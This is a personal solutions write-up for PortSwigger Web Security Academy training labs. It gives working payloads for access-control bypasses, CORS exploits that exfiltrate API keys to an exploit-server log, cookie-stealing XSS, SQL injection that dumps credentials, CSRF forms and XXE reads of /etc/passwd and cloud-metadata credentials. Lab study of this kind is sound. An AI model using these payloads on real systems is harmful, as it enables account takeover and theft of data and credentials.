# Portswigger - Web Security Academy (Solutions)

> Upsolve the actual solutions as well.

## Contents

1. [Access Control](#access-control)
2. [CORS](#cors)
3. [XSS](#xss)
4. [SQLi](#sqli)
5. [CRSF](#csrf)
6. [XXE](#xxe)

## Access Control

```
Unprotected admin functionality: robots.txt
Unprotected admin functionality with unpredictable URL: view source => js to check admin => /admin-uhsegl
User role controlled by request paramter: login as wiener/peter => go to /admin
User role can be modified in user profile: 
```

#### URL-based access control can be circumvented

```http
POST / HTTP/1.1
Cookie: session=FQxqrQ8PJHEBARHT7se4bxv6sqHGrQJD
X-Original-URL: /admin
```

#### Method-based access control can be circumvented
```
Login as wiener/peter:
PUT /admin-roles HTTP/1.1
Cookie: session=UdlpEENsbTjmMhi15gFrGZLzPJlprpTK
username=wiener&action=upgrade
```

#### User ID controlled by request parameter
```
Login as wiener/peter:
/my-account?id=carlos

Copy and submit the API key
```

#### User ID controlled by request parameter, with unpredictable user IDs 
```
Login as wiener/peter:
Go to /post?postId=3, to find carlos' userId.
User that userId to get API key from My Account page.
```

#### User ID controlled by request parameter with data leakage in redirect
```
Login as wiener/peter
Go to /my-account?id=carlos => it redirects back to home page
Go to /my-account?id=carlos and intercept the response in Burp
Before redirection, the API key for carlos is leaked.
```

#### User ID controlled by request parameter with password disclosure
```
Login as wiener/peter
Go to /my-account?user=administrator
Change input type of password to text
Login as administrator/xj6efi
Delete carlos
```

#### Insecure Direct Object References
```
Login as wiener/peter
Go to /chat and Download Transcript
Intercept request in Burp to see that transcript is being downloaded from /download-transcript/2.txt
Go to /download-transcript/1.txt
Get carlos' password: qahe69
Login to carlos' account
```

#### Multi-step process with no access control on one step
```
Login as adminstrator/admin
Observe request for upgrading a user:

POST /admin-roles HTTP/1.1
action=upgrade&confirmed=true&username=wiener

Repeat the request while logged in as wiener
```

#### Referer-based access control
```
Login as administrator/admin
Go to /admin
Upgrade a user and intercept the request in Burp

GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Referer: https://ace91fd81fbaa096804b8c630061001c.web-security-academy.net/admin

Login as wiener/peter and send the request.
```

#### CORS vulnerability with basic origin reflection

1. Login as wiener/peter
2. Go to /my-account
3. /my-account?id=admin is blocked

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Cookie: session=RP4LxEeQbjJvfMad0sA9P4ECWmB3r99S
Access-Control-Allow-Origin: https://acf41fe01f16167180030e2a00fd001d.web-security-academy.net
Access-Control-Allow-Credentials: true
```

Go to exploit server:
```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://acf41fe01f16167180030e2a00fd001d.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();function reqListener() {
	location='//ac401f581f15167f809a0e1701320092.web-security-academy.net/log?key='+this.responseText;
};
```

Submit exploit to victim and go to /log:
```
192.168.1.12    2020-02-05 19:14:00 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22hvhwIMzFHlIEZpEPGhdJ9EAzV06nOMmw%22} HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 PSAcademy/661765"
```

#### CORS vulnerability with trusted null origin

Send this to the victim.

```javascript
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://acbd1fbe1fd78cf3807331b900be00fc.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://ac6c1fc91feb8cf080ee316001f5002a.web-security-academy.net/log?key='+this.responseText;
};
</script>"></iframe> 
```

Check the log

```
192.168.1.12    2020-02-06 19:27:31 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22oyEfZl4UJC3kIc6IvycliwYYSdIwliXj%22} HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 PSAcademy/939914"
```

#### CORS vulnerability with trusted insecure protocols

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://ac141fb91e0fb1fb80430683009d0046.web-security-academy.net/my-account?id=administrator',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location = "https://ac061f511ee2b1b680d60692012f00fd.web-security-academy.net/log?key=this.responseText";
}
</script>
```

#### CORS vulnerability with internal network pivot attack

```TBD```

## XSS
#### Reflected XSS into HTML context with nothing encoded

Search bar `<img src=x onerror=alert(1)>`

#### Reflected XSS into HTML context with most tags and attributes blocked
`<h1>0 search results for 'asdf'</h1>`

- `<script>alert(document.cookie)</script>` tags not allowed.
- `alert(document.cookie)` is not blocked.
- `<>` tags not allowed.
- No URL encoding.

Couldn't figure it out after a long time, so looked at the solution.

- Use Burp to intercept search request.
- Send request to Intruder.
- Copy payloads from cheat sheet.
- Saw that `<body>` returned 200.
- Copy events from cheat sheet.
- `<body resize=1>` returned 200.
- But, we need to resize the body to trigger the payload.
- Therefore, change width `onload`.

```html
<iframe src="https://acd01f971f79e697801234c9007200e0.web-security-academy.net/?search=%3Cbody+onresize%3Dalert%28document.cookie%29%3E" onload=this.style.width='100px'>
```

#### Reflected XSS into HTML context with all tags blocked except custom ones
Intended solution:

```html
<script>
location = 'https://ac511fab1f3d1c45803b260200ad008e.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
</script>
```

#### Reflected XSS with event handlers and href attributes blocked ⭐
I first checked all the tags that are allowed using this [script](xss/rxss-blocked-href-event.py).

```
a
animate
discard
image
svg
title
```

Then after modifying a payload from [here](https://brutelogic.com.br/blog/xss-without-event-handlers/) I got a working payload:
```<svg><a xmlns:xlink=http://www.w3.org/1999/xlink><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=%26>```

Intended solution (which didn't work for me for some reason): `<svg><a><animate+attributeName=href+values=javascript:alert(1)+/><text+x=20+y=20>Click me</text></a>`

#### Stored XSS into HTML context with nothing encoded
Comment `<img src=x onerror=alert(1)>`

#### DOM XSS in document.write sink using source location.search
The sink and source are in embedded javascript within the search page.

```javascript
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    trackSearch(query);
}	
```

Using this payload `x"><script>alert(1)</script><img src="x` the document.write will look like:

```
<img src="/resources/images/tracker.gif?searchTerms=x"><script>alert(1)</script><img src="x">
```

Intended solution `"><svg onload=alert(1)>`

#### DOM XSS in document.write sink using source location.search inside a select element
Relevant code

```javascript
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
    document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) {
        continue;
    }
    document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
```

- We see that `storeId` is acting as a sink.
- As soon as we add it to the query, we get it as an option in select.
- We will have to close option and select tags and then inject our alert payload.

```html
<select name="storeId">
	<option>London</option>
	<option>Paris</option>
	<option>Milan</option>
</select>
```

Working payload `</option></select><svg onload=alert(1)>`
Intended solution `"></select><img src=1 onerror=alert(1)>`


- The innerHTML sink doesn't accept script elements on any modern browser, nor will svg onload events fire.
- This means you will need to use alternative elements like img or iframe.

```element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'```

#### DOM XSS in innerHTML sink using source location.search

Relevant code

```javascript
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    doSearchQuery(query);
}
```

- Doesn't work `</span><script>alert(1)</script><span>` (due to innerHTML restrictions above)
- Does work `<img src=1 onerror=alert(1)>`

#### DOM XSS in jQuery anchor href attribute sink using location.search source

Relevant code

```javascript
$(function() {
	$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
```

- Putting `/feedback?returnPath=javascript:alert(1)` pops alert on clicking the link, but we need a 0-click payload.
- Doesn't work `/feedback?returnPath="><img src=x onerror=alert(1)><a href="`
- Works `/feedback?returnPath=javascript:onload=alert(document.cookie)`

#### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
Using Wappalyzer, I found out that the AngularJS version is 1.7.7 and from this [blog](https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs) by Gareth Heyes I found out the corresponding payload in Angular >= 1.6.0 which doesn't have a sandbox. `{{constructor.constructor('alert(1)')()}}`

Intended solution `{{$on.constructor('alert(1)')()}}`

#### Reflected DOM XSS
In file searchResult.js breakpoint at line 5.

```javascript
eval('var searchResultsObj = ' + this.responseText);
```

In console check value of `this.responseText`

```javascript
"{\"searchTerm\":\"asdf\",\"results\":[]}"
```

Therefore searchTerm under searchResultObj is user supplied. It is being sunk at line 19.

```javascript
h1.innerText = searchResults.length + " search results for '" + searchTerm + "'";
```

XSS in [innerText](https://stackoverflow.com/questions/52707031/does-innertext-prevent-xss).

## SQLi
#### SQL injection UNION attack, determining the number of columns returned by the query

1. Initial request: `GET /filter?category=Food+%26+Drink`
2. Guess: `SELECT name, price FROM products WHERE category='[input]'`
3. SQL query attempts:
    - `/filter?category='+ORDER+BY+3--`
    - `/filter?category='+UNION+SELECT+id,name,price+FROM+products--`
4. Just had to return an additional row containing null values.

#### SQL injection UNION attack, finding a column containing text 
- `/filter?category=Corporate+gifts'+UNION+SELECT+price,null,null+FROM+products--`
- `/filter?category=Corporate+gifts'+UNION+SELECT+1337,table\_name,null+FROM+information\_schema.tables--`
- `/filter?category='+UNION+SELECT+null,column\_name,null+FROM+information\_schema.columns+WHERE+table\_name='products'--`
- `/filter?category='+UNION+SELECT+null,'0tb9ew',null+FROM+products--` :/

#### SQL injection UNION attack, retrieving data from other tables
- `/filter?category=Gifts'+ORDER+BY+2--`
- `/filter?category=Gifts'+union+select+username,password+from+users--`

#### SQL injection UNION attack, retrieving multiple values in a single column
`/filter?category=Gifts'+union+select+1,username||':'||password+from+users--`

#### SQL injection attack, querying the database type and version on Oracle
`/filter?category='+union+select+null,banner+FROM+v$version--`

#### SQL injection attack, querying the database type and version on MySQL and Microsoft
`/filter?category=Gifts'+union+select+@@version,null+--+`

#### SQL injection attack, listing the database contents on non-Oracle databases
- `/filter?category='+union+select+version(),null--`
- `/filter?category='+union+select+table\_name,null+from+information\_schema.tables--` 
- `/filter?category='+union+SELECT+null,column\_name+FROM+information\_schema.columns+WHERE+table\_name='users\_tgviyo'--`
- `/filter?category='+union+SELECT+username\_bzrpfl,password\_mignev+from+users\_tgviyo--`

#### SQL injection attack, listing the database contents on Oracle
- `/filter?category='+union+select+null,table\_name+from+all\_tables--`
- `/filter?category='+union+select+null,column\_name+from+all\_tab\_columns+where+table\_name='USERS\_QCHNKE'`
- `/filter?category='+union+select+USERNAME\_NREBWP,PASSWORD\_TKLBZQ+from+USERS\_QCHNKE--`

#### Blind SQL injection with conditional responses
Wrote a [script](sqli/sqli-blind-boolean-response.py) to compare substring and check reponse text.

#### Blind SQL injection with conditional errors ⭐
Similar script as conditional responses over [here](sqli/sqli-blind-boolean-error.py).

#### Blind SQL injection with time delays ⭐
Doesn't work:
- `Cookie: TrackingId=' or pg_sleep(10)--;`
- `Cookie: TrackingId=' union select pg_sleep(10)--;`

Intended solution:
`Cookie: TrackingId=' || pg_sleep(10)--;`

#### Blind SQL injection with time delays and information retrieval
Take a look at [this](sqli/sqli-bind-time.py) script.

#### Blind SQL injection with out-of-band interaction

```TBD```

#### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
`/filter?category=' or 1=1--`

#### SQL injection vulnerability allowing login bypass
Entered this in the username field `administrator'--`

## CSRF
#### CSRF vulnerability with no defenses
```html
<form id="login-form" action="https://ac7c1f141f49363a802c49eb00fa00e2.web-security-academy.net/email/change-email" method="POST">
<input required type="email" name="email" value="hello@gmail.com">
</form>

<script>
    document.getElementById('login-form').submit();
</script>
```

#### CSRF where token validation depends on request method
Change `POST` to `GET` and shift parameters to url.

```html
<script>
location = 'https://ac4c1f501e3bfd64806c06d0000f0051.web-security-academy.net/email/change-email?email=asdf%40gmail.com&csrf=vHc3lGN9FC8ykr2S0jFKrjFZePqCMXx7';
</script>
```

## XXE
#### Exploiting XXE using external entities to retrieve files

```xml
<?xml version="1.0"?>
    <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <stockCheck>
        <productId>&xxe;</productId>
        <storeId></storeId>
    </stockCheck>
```

#### Exploiting XXE to perform SSRF attacks

```xml
<?xml version="1.0"?>
    <!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>
    <stockCheck>
        <productId>&xxe;</productId>
        <storeId></storeId>
    </stockCheck>
```

